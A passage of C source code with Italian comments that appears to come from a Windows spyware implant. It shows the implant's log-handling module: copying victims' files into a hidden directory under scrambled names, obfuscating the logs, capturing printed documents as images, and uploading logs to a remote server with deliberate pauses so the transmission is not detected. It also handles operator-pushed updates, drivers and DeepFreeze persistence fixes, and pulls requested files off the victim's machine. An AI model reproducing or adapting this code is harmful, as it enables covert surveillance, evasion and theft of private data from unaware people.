		// Esce perche' quando il file da leggere e' finito dwRead e' 0
		// e Log_WriteFile ritorna FALSE se gli fai scrivere 0 byte
		if (!Log_WriteFile(hdst, temp_buff, dwRead))
			break;
	}

	SAFE_FREE(temp_buff);
	CloseHandle(hsrc);
	CloseHandle(hdst);
	return TRUE;
}

// Crea un file di log di tipo "file capture" vuoto, nel caso non sia stato possibile catturarlo per size 
// Specifica la size nel nome del file stesso
BOOL Log_CryptCopyEmptyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD existent_file_len, DWORD agent_tag)
{
	HANDLE hdst;
	DWORD dwRead;
	BY_HANDLE_FILE_INFORMATION dst_info;
	DWORD existent_file_size = 0;
	BYTE *file_additional_data;
	BYTE *log_file_header;
	FileAdditionalData *file_additiona_data_header;
	DWORD header_len;
	WCHAR to_display[MAX_PATH];

	if (display_name) 
		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", display_name, existent_file_len);		
	else
		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", src_path, existent_file_len);		

	// Crea l'header da scrivere nel file
	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
		return FALSE;
	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
	SAFE_FREE(file_additional_data);
	if (!log_file_header)
		return FALSE;
	
	// Prende le info del file destinazione (se esiste)
	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hdst != INVALID_HANDLE_VALUE) {
		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
			existent_file_size = dst_info.nFileSizeLow;
		}
		CloseHandle(hdst);
	}

	// Controlla che ci sia ancora spazio per scrivere su disco
	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
		SAFE_FREE(log_file_header);
		return FALSE;
	}

	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		return FALSE;
	}
	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
	// recuperata.
	log_free_space += existent_file_size;

	// Scrive l'header nel file
	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
		CloseHandle(hdst);
		SAFE_FREE(log_file_header);
		return FALSE;
	}
	if (log_free_space >= header_len)
		log_free_space -= header_len;

	SAFE_FREE(log_file_header);
	FNC(FlushFileBuffers)(hdst);
	CloseHandle(hdst);
	return TRUE;
}


// Copia il file nella directory nascosta. Fa un hash del path.
// File con path uguale vengono sovrascritti. Effettua la copia solo
// se la destinazione non ha la stessa data della sorgente.
BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD agent_tag)
{
	HANDLE hfile;
	BY_HANDLE_FILE_INFORMATION src_info, dst_info;
	char red_fname[100];
	char log_wout_path[_MAX_FNAME];
	char dest_file_path[DLLNAMELEN];
	char dest_file_mask[DLLNAMELEN];
	char *scrambled_name;
	nanosec_time src_date, dst_date;
	FILETIME time_nanosec;
	//SYSTEMTIME system_time;
	WIN32_FIND_DATA ffdata;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	
	// Prende le informazioni del file sorgente
	hfile = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	if (!FNC(GetFileInformationByHandle)(hfile, &src_info)) {
		CloseHandle(hfile);
		return FALSE;
	}
	CloseHandle(hfile);

	// Check se e' una directory
	if (src_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		return FALSE;

	// Vede se la dimensione e' consistente
	if (src_info.nFileSizeHigh>0 || src_info.nFileSizeLow==0) 
		return FALSE;
	
	// fa lo SHA1 del path in red_fname
	SHA1Context sha;
	SHA1Reset(&sha);
    SHA1Input(&sha, (const unsigned char *)src_path, (DWORD)(wcslen(src_path)*2));
	if (!SHA1Result(&sha)) 
		return FALSE;

	memset(red_fname, 0, sizeof(red_fname));
	for (int i=0; i<(SHA_DIGEST_LENGTH/sizeof(int)); i++) 
		sprintf(red_fname+(i*8), "%.8X", sha.Message_Digest[i]);

	// Vede se ha gia' catturato questo file...
	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "?LOGF%.4X%s*.log", agent_tag, red_fname);
	if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) ) 
		return FALSE;	
	HM_CompletePath(scrambled_name, dest_file_mask);
	SAFE_FREE(scrambled_name);
	hFind = FNC(FindFirstFileA)(dest_file_mask, &ffdata);
	if (hFind != INVALID_HANDLE_VALUE) {
		//...se l'ha gia' catturato usa il vecchio nome
		HM_CompletePath(ffdata.cFileName, dest_file_path);
		FNC(FindClose)(hFind);
	} else {
		// ...altrimenti gli crea un nome col timestamp attuale
		FNC(GetSystemTimeAsFileTime)(&time_nanosec);
		//FNC(SystemTimeToFileTime)(&system_time, &time_nanosec);	
		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%s%.8X%.8X.log", log_active_queue, agent_tag, red_fname, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) ) 
			return FALSE;	
		HM_CompletePath(scrambled_name, dest_file_path);
		SAFE_FREE(scrambled_name);
	}

	// Prende le info del file destinazione (se esiste)
	hfile = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		if (!FNC(GetFileInformationByHandle)(hfile, &dst_info)) {
			CloseHandle(hfile);
			return FALSE;
		}
		CloseHandle(hfile);

		// Compara le date dei due file (evita riscritture dello stesso file)
		src_date.hi_delay = src_info.ftLastWriteTime.dwHighDateTime;
		src_date.lo_delay = src_info.ftLastWriteTime.dwLowDateTime;
		dst_date.hi_delay = dst_info.ftLastWriteTime.dwHighDateTime;
		dst_date.lo_delay = dst_info.ftLastWriteTime.dwLowDateTime;
		if (!IsGreaterDate(&src_date, &dst_date)) 
			return FALSE;
	}
	
	// Se non doveva essere copiato tutto per via della size...
	if (empty_copy) {
		if (!Log_CryptCopyEmptyFile(src_path, dest_file_path, display_name, src_info.nFileSizeLow, agent_tag)) 
			return FALSE;
		return TRUE;
	}

	// Effettua la vera copia.
	if (!Log_CryptCopyFile(src_path, dest_file_path, display_name, agent_tag)) 
		return FALSE;

	return TRUE;
}

// Scrive in un file di log.
// Controlla la quota disco
// Torna TRUE se ha successo
// E' conforme al nuovo formato di log (lunghezza in cleartext + blocco cifrato)
BOOL Log_WriteFile(HANDLE handle, BYTE *clear_buffer, DWORD clear_len)
{
	DWORD dwTmp;
	BOOL ret_val;
	DWORD crypt_len = 0;
	BYTE *crypt_buffer = NULL;

	// Controlla che la richiesta sia valida
	if (handle == INVALID_HANDLE_VALUE || clear_len == 0 || clear_buffer == NULL)
		return FALSE;

	// Offusca il buffer. La funzione torna una copia del buffer
	// gia' offuscata, e la dimensione di essa. La copia va
	// liberata (se e' stata allocata).
	crypt_buffer = LOG_Obfuscate(clear_buffer, clear_len, &crypt_len);

	// Controlla lo spazio disco rimasto e che la cifratura
	// sia andata a buon fine
	if (!crypt_buffer || crypt_len > log_free_space) {
		SAFE_FREE(crypt_buffer);
		return FALSE;
	}

	ret_val = FNC(WriteFile)(handle, crypt_buffer, crypt_len, &dwTmp,  NULL);
	SAFE_FREE(crypt_buffer);

	// Se ha scritto con successo, diminuisce lo spazio residuo
	// XXX Potrebbe esserci una race condition e log_free_space 
	// diventerebbe enorme...(abbastanza remoto)
	// Col doppio check diminuisco le possiblita' di race 
	// condition ulteriormente.
	if (ret_val && crypt_len<=log_free_space)
		log_free_space -= crypt_len;

	// Cancellata per questioni di performance di skype
	//FNC(FlushFileBuffers)(handle);

	return ret_val;
}


// Elimina da una stringa tutti i caratteri non 
// alfanumerici
void Log_Sanitize(char *name)
{
	unsigned char *ptr;
	for(ptr=(unsigned char *)name; *ptr!=0; ptr++)
		if (*ptr != ' ' && *ptr != '-' && *ptr != '.' && *ptr != '@' && *ptr != '+') 
			if (*ptr<'0' || (*ptr>'9' && *ptr<'A') || (*ptr>'Z' && *ptr<'a') || *ptr>'z')
				*ptr = ' ';
}


// Cancella i log troppo vecchi o troppo "ciccioni"
#define SECS_TO_FT_MULT 10000000
void LOG_Purge(long long f_time, DWORD size)
{
	char log_file_path[DLLNAMELEN];
	WIN32_FIND_DATA FindFileData;
	char DirSpec[DLLNAMELEN];  
	char *scrambled_search;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	LARGE_INTEGER li;  
	FILETIME ft;
	
	if (f_time==0 && size==0)
		return;

	li.QuadPart = (f_time + 0x00000002b6109100) * SECS_TO_FT_MULT;
	ft.dwLowDateTime = li.LowPart;
	ft.dwHighDateTime = li.HighPart;

	scrambled_search = LOG_ScrambleName2("*.log", crypt_key[0], TRUE);
	if (!scrambled_search)
		return;

	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if ( (size && (FindFileData.nFileSizeHigh>0 || FindFileData.nFileSizeLow>=size)) ||
				(f_time && IsNewerDate(&ft, &FindFileData.ftCreationTime))) {
				HM_CompletePath(FindFileData.cFileName, log_file_path);
				HM_WipeFileA(log_file_path);
			}
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}

	// XXX Cerca anche il purge per i log con il vecchio scrambling...
	scrambled_search = LOG_ScrambleName("*.log", crypt_key[0], TRUE);
	if (!scrambled_search)
		return;

	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if ( (size && (FindFileData.nFileSizeHigh>0 || FindFileData.nFileSizeLow>=size)) ||
				(f_time && IsNewerDate(&ft, &FindFileData.ftCreationTime))) {
				HM_CompletePath(FindFileData.cFileName, log_file_path);
				HM_WipeFileA(log_file_path);
			}
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}
}


// Scambia la coda di log attiva con quella inattiva
void Log_SwitchQueue()
{
	char search_mask[64];
	char *scrambled_search;
	char DirSpec[DLLNAMELEN];
	char DestSpec[DLLNAMELEN];
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// La coda attiva e' sempre la 0!
	log_active_queue = 0;

	sprintf(search_mask, "%.1XLOG*.log", log_active_queue);
	scrambled_search = LOG_ScrambleName2(search_mask, crypt_key[0], TRUE);
	if (!scrambled_search)
		return;

	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
	// quindi posso usare le wildcard).
	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			HM_CompletePath(FindFileData.cFileName, DirSpec); // Nome File sorgente in DirSpec
			memcpy(DestSpec, DirSpec, sizeof(DestSpec));
			scrambled_search = LOG_ScrambleName2("1", crypt_key[0], TRUE);
			if (!scrambled_search)
				break;

			char *q = strrchr(DestSpec, '\\');
			if (q) {
				q++;
				*q = scrambled_search[0]; // Nome File destinazione in DestSpec
				SAFE_FREE(scrambled_search);
			} else {
				SAFE_FREE(scrambled_search);
				break;
			}
			MoveFile(DirSpec, DestSpec);					

		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}

	// XXX Cerca di switchare anche i log con il vecchio scrambling
	sprintf(search_mask, "%.1XLOG*.log", log_active_queue);
	scrambled_search = LOG_ScrambleName(search_mask, crypt_key[0], TRUE);
	if (!scrambled_search)
		return;

	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
	// quindi posso usare le wildcard).
	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			HM_CompletePath(FindFileData.cFileName, DirSpec); // Nome File sorgente in DirSpec
			memcpy(DestSpec, DirSpec, sizeof(DestSpec));
			scrambled_search = LOG_ScrambleName("1", crypt_key[0], TRUE);
			if (!scrambled_search)
				break;

			char *q = strrchr(DestSpec, '\\');
			if (q) {
				q++;
				*q = scrambled_search[0]; // Nome File destinazione in DestSpec
				SAFE_FREE(scrambled_search);
			} else {
				SAFE_FREE(scrambled_search);
				break;
			}
			MoveFile(DirSpec, DestSpec);					

		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}
}

// Funzione esportata per permettere di loggare una bitmap 
#include "HM_BitmapCommon.h"
typedef struct _PrintAdditionalData {
	UINT uVersion;
		#define LOG_PRINT_VERSION 2009031201
	UINT uDocumentNameLen;
} PrintAdditionalData;

void __stdcall Log_PrintDC(WCHAR *doc_name, HDC print_dc, HBITMAP print_bmp, DWORD x_dim, DWORD y_dim)
{
	BITMAPINFOHEADER bmiHeader;
	DWORD *pdwFullBits = NULL;
	HDC safe_dc, g_hScrDC;
	HBITMAP safe_bmp;
	PrintAdditionalData *print_additional_header;
	BYTE *log_header;
	DWORD additional_len;

	// Crea un DC e una bitmap compatibili con lo schermo 
	if ( !(g_hScrDC = CreateDC("DISPLAY", NULL, NULL, NULL)) )
		return;
	safe_dc = CreateCompatibleDC(NULL);
	safe_bmp = CreateCompatibleBitmap(g_hScrDC, x_dim, y_dim);
	DeleteDC(g_hScrDC);
	SelectObject(safe_dc, safe_bmp);

	// Alloca la bitmap di dimensione sicuramente superiore a quanto sara' 
	if ( !(pdwFullBits = (DWORD *)malloc(x_dim * y_dim * sizeof(DWORD))) )
		return;

	// Copia il print_memory_dc nel dc compatibile con lo schermo
	// per l'acquisizione in bitmap
	//BitBlt(safe_dc, 0, 0, x_dim, y_dim, print_dc, 0, 0, SRCCOPY);
	// Settaggi per il capture dello screen
	ZeroMemory(&bmiHeader, sizeof(BITMAPINFOHEADER));
	bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmiHeader.biWidth = x_dim;
	bmiHeader.biHeight = y_dim;
	bmiHeader.biPlanes = 1;
	bmiHeader.biBitCount = 24;
	bmiHeader.biCompression = BI_RGB;

	FNC(GetDIBits)(print_dc, print_bmp, 0, y_dim, pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS);
	SetDIBits(safe_dc, safe_bmp, 0, y_dim, pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS);

	bmiHeader.biBitCount = 16;
	bmiHeader.biSizeImage = bmiHeader.biWidth * bmiHeader.biHeight * (bmiHeader.biBitCount/8);

	// Prende il contenuto del DC
	if (FNC(GetDIBits)(safe_dc, safe_bmp, 0, y_dim, pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS)) {	
		additional_len = sizeof(PrintAdditionalData) + wcslen(doc_name)*sizeof(WCHAR);
		log_header = (BYTE *)malloc(additional_len);
		if (log_header) {
			// Crea l'header addizionale
			print_additional_header = (PrintAdditionalData *)log_header;
			print_additional_header->uVersion = LOG_PRINT_VERSION;
			print_additional_header->uDocumentNameLen = wcslen(doc_name)*sizeof(WCHAR);
			log_header+=sizeof(PrintAdditionalData);
			memcpy(log_header, doc_name, print_additional_header->uDocumentNameLen);

			//Output su file
			BmpToJpgLog(PM_PRINTAGENT, (BYTE *)print_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50);
			SAFE_FREE(print_additional_header);
		}
	}

	// Rilascio oggetti....
	if (safe_bmp) DeleteObject(safe_bmp);
	if (safe_dc) DeleteDC(safe_dc);
	SAFE_FREE(pdwFullBits);
}


//------------------- FUNZIONI PER LA SPEDIZIONE DEI LOG ---------------

BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
{
	char log_file_path[DLLNAMELEN];
	WIN32_FIND_DATA FindFileData;
	char DirSpec[DLLNAMELEN];  
	char *scrambled_search;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD log_count = 0;
	UINT64 log_size = 0;

	scrambled_search = LOG_ScrambleName2("OUTF*.log", crypt_key[0], TRUE);
	if (!scrambled_search)
		return FALSE;

	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE) 
		return TRUE;
	do {
		if (FindFileData.nFileSizeLow>0) {
			log_count++;
			log_size+=FindFileData.nFileSizeLow;
		}
	} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
	FNC(FindClose)(hFind);

	if (log_count>0)
		if (!ASP_SendStatus(log_count, log_size))
			return FALSE;

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			HM_CompletePath(FindFileData.cFileName, log_file_path);
			if (IsCrisisNetwork()) 
				break;
			if (FindFileData.nFileSizeLow==0 || ASP_SendLog(log_file_path, band_limit)) {
				HM_WipeFileA(log_file_path);
				LOG_SendPause(min_sleep, max_sleep);
			}
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}
	return TRUE;
}

// Invia la coda dei log al server
// I file vuoti vengono semplicemente cancellati
// Il band limit e' in byte al secondo
BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
{
	char log_file_path[DLLNAMELEN];
	WIN32_FIND_DATA FindFileData;
	char DirSpec[DLLNAMELEN];  
	char *scrambled_search;
	char search_mask[64];
	log_list_struct *log_list;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD tmp_free_space;
	DWORD log_count = 0;
	UINT64 log_size = 0;

	// Cerca tutti i file di tipo "1/0LOG*.log", sia LOG_, sia LOGF_
	// Sono i nuovi tipi di log
	sprintf(search_mask, "%.1XLOG*.log", !log_active_queue);
	scrambled_search = LOG_ScrambleName2(search_mask, crypt_key[0], TRUE);
	if (!scrambled_search)
		return FALSE;
	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
	// quindi posso usare le wildcard).
	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			InsertLogList(&log_list_head, &FindFileData);
			if (FindFileData.nFileSizeLow > 0) {
				log_count++;
				log_size += FindFileData.nFileSizeLow;
			}
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}

	// Cerca anche i log con il vecchio scrambling...
	sprintf(search_mask, "%.1XLOG*.log", !log_active_queue);
	scrambled_search = LOG_ScrambleName(search_mask, crypt_key[0], TRUE);
	if (!scrambled_search)
		return FALSE;
	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
	// quindi posso usare le wildcard).
	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			InsertLogList(&log_list_head, &FindFileData);
			if (FindFileData.nFileSizeLow > 0) {
				log_count++;
				log_size += FindFileData.nFileSizeLow;
			}
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}

	if (log_count>0) {
		if (!ASP_SendStatus(log_count, log_size)) {
			FreeLogList(&log_list_head);
			ASP_Bye();
			return FALSE;
		}
	}

	// Scorre la lista dei file di log ordinata per data
	log_list = log_list_head;
	for(log_list = log_list_head; log_list; log_list = log_list->next) {			
		HM_CompletePath(log_list->file_name, log_file_path);

		// Se un file e' vuoto, lo cancella e basta
		if (log_list->size == 0) {
			HM_WipeFileA(log_file_path);
			continue;
		}

		// Se siamo in stato di crisi non invia neanche il BYE
		if (IsCrisisNetwork()) {
			FreeLogList(&log_list_head);
			return FALSE;
		}

		// Invia il log 
		if (!ASP_SendLog(log_file_path, band_limit)) {
			if (GetLogSize(log_file_path) > LOG_SIZE_MAX) {
				HM_WipeFileA(log_file_path);
				tmp_free_space = log_free_space + log_list->size;
				if (tmp_free_space > log_free_space) 
					log_free_space = tmp_free_space;
			}
			FreeLogList(&log_list_head);
			ASP_Bye(); // Se fallisce con PROTO_NO chiude correttamente la sessione
			return FALSE;
		}

		// Cancella il log appena inviato
		HM_WipeFileA(log_file_path); 

		// Restituisce lo spazio disco (evitando overflow dovuti a race)
		tmp_free_space = log_free_space + log_list->size;
		if (tmp_free_space > log_free_space) // la somma deve solo che farlo aumentare
			log_free_space = tmp_free_space;

		// Fa una pausa per evitare che sia rilevabile una trasmissione
		// di dati continua
		LOG_SendPause(min_sleep, max_sleep);
	}
	FreeLogList(&log_list_head);
	ASP_Bye();
	return TRUE;
}

// Se in wildpath e' presente una wildcard la sosituisce con file_name
// e mette comunque tutto in dest_path.
// Torna dest_path.
WCHAR *LOG_CompleteWild(WCHAR *wild_path, WCHAR *file_name, WCHAR *dest_path)
{
	WCHAR *wild_ptr;
	
	dest_path[0] = 0; // Termina per sicurezza paranoica...
	wcscpy(dest_path, wild_path);
	wild_ptr = wcsrchr(dest_path, L'\\');
	// Sostituisce all'ultimo slash
	if (wild_ptr) {
		wild_ptr++;
		wcscpy(wild_ptr, file_name);
	}

	return dest_path;
}

void UpdateDriver(char *source_path)
{
	char sys_path[DLLNAMELEN];
	char comp_path[DLLNAMELEN*2];
	PVOID old_value;
	/*
	if (!IsDriverRunning(DRIVER_NAME_W))
		return;
	
	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
		return;
	sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\drivers\\", DRIVER_NAME);
	
	old_value = DisableWow64Fs();
	CopyFile(source_path, comp_path, FALSE);	
	RevertWow64Fs(old_value);*/
}

// I file uploadati vengono messi nella working dir.
// Torna FALSE se qualcosa fallisce.
// Gestisce anche la ricezione del codec e degli update.
// Gestisce anche gli upgrade
BOOL LOG_HandleUpload(BOOL is_upload)
{
	WCHAR file_name[MAX_PATH];
	char c_file_name[MAX_PATH];
	char s_file_path[MAX_PATH];
	char d_file_path[MAX_PATH];
	DWORD upload_left;

	do {
		if (IsCrisisNetwork())
			return FALSE;

		if (!ASP_GetUpload(is_upload, file_name, sizeof(file_name), &upload_left))
			return FALSE;

		if (is_upload)
			continue;
		// Se si tratta di upgrade cerca di capire cosa sono....

		_snprintf_s(c_file_name, sizeof(c_file_name), "%S", file_name);
		if(!strcmp(c_file_name, COMMON_CODEC_NAME))   {
			CopyFile(HM_CompletePath(COMMON_CODEC_NAME, s_file_path), HM_CompletePath(H4_CODEC_NAME, d_file_path), FALSE);
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else if(!strcmp(c_file_name, COMMON_UPDATE_NAME)) { 
			if (CopyFile(HM_CompletePath(COMMON_UPDATE_NAME, s_file_path), HM_CompletePath(H4_UPDATE_FILE, d_file_path), FALSE)) {
				HM_InsertRegistryKey(H4_UPDATE_FILE, TRUE);
				if (IsDeepFreeze()) {
					HideDevice dev_df;
					DFFixCore(&dev_df, (unsigned char *)H4_UPDATE_FILE, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, TRUE);
				}
			}
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
		} else if(!strcmp(c_file_name, COMMON_UPDATE64_NAME)) {
			Kill64Core();
			Sleep(1000); // Aspetta in caso la dll64 sia in qualche thread di hooking
			CopyFile(HM_CompletePath(COMMON_UPDATE64_NAME, s_file_path), HM_CompletePath(H64DLL_NAME, d_file_path), FALSE);
			Run64Core();
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else if(!strcmp(c_file_name, COMMON_MOBILE_CORE_NAME)) {
			CopyFile(HM_CompletePath(COMMON_MOBILE_CORE_NAME, s_file_path), HM_CompletePath(H4_MOBCORE_NAME, d_file_path), FALSE);
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else if(!strcmp(c_file_name, COMMON_MOBILE_ZOO_NAME)) {
			CopyFile(HM_CompletePath(COMMON_MOBILE_ZOO_NAME, s_file_path), HM_CompletePath(H4_MOBZOO_NAME, d_file_path), FALSE);
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else if(!strcmp(c_file_name, COMMON_RAPI_NAME)) {
			CopyFile(HM_CompletePath(COMMON_RAPI_NAME, s_file_path), HM_CompletePath("rapi.dll", d_file_path), FALSE);
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else if(!strcmp(c_file_name, COMMON_SQLITE_NAME)) {
			CopyFile(HM_CompletePath(COMMON_SQLITE_NAME, s_file_path), HM_CompletePath("sqlite.dll", d_file_path), FALSE);
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else if(!strcmp(c_file_name, COMMON_EXE_INSTALLER_NAME)) {
			CopyFile(HM_CompletePath(COMMON_EXE_INSTALLER_NAME, s_file_path), HM_CompletePath(EXE_INSTALLER_NAME, d_file_path), FALSE);
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else if(!strcmp(c_file_name, COMMON_DRV32_NAME)) {
			if (!IsX64System()) {
				CopyFile(HM_CompletePath(COMMON_DRV32_NAME, s_file_path), HM_CompletePath(H4DRIVER_NAME, d_file_path), FALSE);
				UpdateDriver(d_file_path);
			} else
				CopyFile(HM_CompletePath(COMMON_DRV32_NAME, s_file_path), HM_CompletePath(H4DRIVER_NAME_ALT, d_file_path), FALSE);
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else if(!strcmp(c_file_name, COMMON_DRV64_NAME)) {
			if (IsX64System()) {
				CopyFile(HM_CompletePath(COMMON_DRV64_NAME, s_file_path), HM_CompletePath(H4DRIVER_NAME, d_file_path), FALSE);
				UpdateDriver(d_file_path);
			} else
				CopyFile(HM_CompletePath(COMMON_DRV64_NAME, s_file_path), HM_CompletePath(H4DRIVER_NAME_ALT, d_file_path), FALSE);
			DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		} else {
			HM_CompletePath(c_file_name, d_file_path);
		}

		// Se non e' uno degli altri file noti lo cancella...
		//if (strcmp(c_file_name, BB_INSTALL_NAME2) && strncmp(c_file_name, BB_INSTALL_NAME1, 5))
		DeleteFile(HM_CompletePath(c_file_name, s_file_path));

		// Se c'e' DeepFreeze fixa i file 
		if (IsDeepFreeze()) {
			HideDevice dev_df;
			WCHAR dest_path[MAX_PATH];
			swprintf(dest_path, L"%S", d_file_path);
			DFFixFile(&dev_df, dest_path);
		}

	} while(upload_left > 0);

	return TRUE;
}

// Gestisce le richieste di download (creando dei log di quel tipo)
BOOL LOG_HandleDownload()
{
	WCHAR **download_array;
	DWORD num_download;
	DWORD i;
	WCHAR path_expanded[MAX_PATH];
	WCHAR path_expand_complete[MAX_PATH*2];
	WCHAR path_expand_display[MAX_PATH*2];
	WIN32_FIND_DATAW find_data;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Tutti gli elementi di download_array andranno liberati
	if (!ASP_GetDownload(&num_download, &download_array))
		return FALSE;

	for (i=0; i<num_download; i++) {
		// Espande eventuali variabili d'ambiente
		// La stringa risultante e' NULL terminata per certo
		// (come quella di partenza).
		if (!HM_ExpandStringsW(download_array[i], path_expanded, sizeof(path_expanded)/sizeof(WCHAR)))
			wcscpy(path_expanded, download_array[i]);

		// Cicla nel caso ci siano delle wildcards
		hFind = FNC(FindFirstFileW)(path_expanded, &find_data);
		if (hFind != INVALID_HANDLE_VALUE) {
			do {
				// Salta le directory
				if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					continue;

				// Sostituisce la wildcard (se presente)
				LOG_CompleteWild(path_expanded, find_data.cFileName, path_expand_complete);
				LOG_CompleteWild(download_array[i], find_data.cFileName, path_expand_display);
				
				// Crea il log di tipo download
				CopyDownloadFile(path_expand_complete, path_expand_display);
			} while (FNC(FindNextFileW)(hFind, &find_data) != 0);
			FNC(FindClose)(hFind);
		}

		// Libera quell'elemento dell'array allocato da ASP_GetDownload
		SAFE_FREE(download_array[i]);
	}

	SAFE_FREE(download_array);
	return TRUE;
}

// Gestisce le richieste di filesystem (creando dei log di quel tipo)
BOOL LOG_HandleFileSystem()
{
	HANDLE hfile;
	fs_browse_elem *fs_array;
	WCHAR dir_expanded[MAX_PATH];
	DWORD num_fs, i;

	// Di tutti gli elementi di fs_array andranno liberate le stringhe
